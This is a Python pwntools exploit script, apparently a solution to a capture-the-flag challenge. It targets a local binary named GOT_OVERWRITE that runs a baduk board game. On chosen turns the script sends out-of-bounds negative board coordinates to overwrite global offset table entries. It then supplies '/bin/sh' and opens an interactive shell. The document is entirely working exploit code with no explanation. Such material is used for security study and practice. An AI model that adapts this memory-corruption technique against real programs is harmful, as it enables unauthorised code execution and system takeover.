from pwn import *

p = process('./GOT_OVERWRITE')

def getBadukPan():
    for i in range(0, 40):
        p.recvline()


print(p.recvline())
print(p.recvline())
getBadukPan()
p.sendline('/bin/sh')

print(p.recvline())

lap = 0x91
for i in range(2, lap+2):
    log.info(f'count: {i}/{lap}')
    if (i == 0x90):
        p.recvuntil('x:')
        p.sendline(b'-2')
        p.recvuntil('y:')
        p.sendline(b'-28')
    elif (i == 0x85):
        p.recvuntil('x:')
        p.sendline(b'-2')
        p.recvuntil('y:')
        p.sendline(b'-27')
    elif (i == 0x04):
        p.recvuntil('x:')
        p.sendline(b'-2')
        p.recvuntil('y:')
        p.sendline(b'-26')
    elif (i == 0x08):
        p.recvuntil('x:')
        p.sendline(b'-2')
        p.recvuntil('y:')
        p.sendline(b'-25')
    else:
        p.recvuntil('x:')
        p.sendline(b'0')
        p.recvuntil('y:')
        p.sendline(b'0')
    p.recvuntil('playing....\n') # thats very good su aI playing....

# gdb.attach(p)

# context.log_level = 'debug'
p.recvuntil('x:')
p.sendline(b'41')
p.recvuntil('y:')
p.sendline(b'41')
p.recvuntil('creator\n')
p.sendline("/bin/sh\x00")
p.interactive()
# gdb.attach(p)
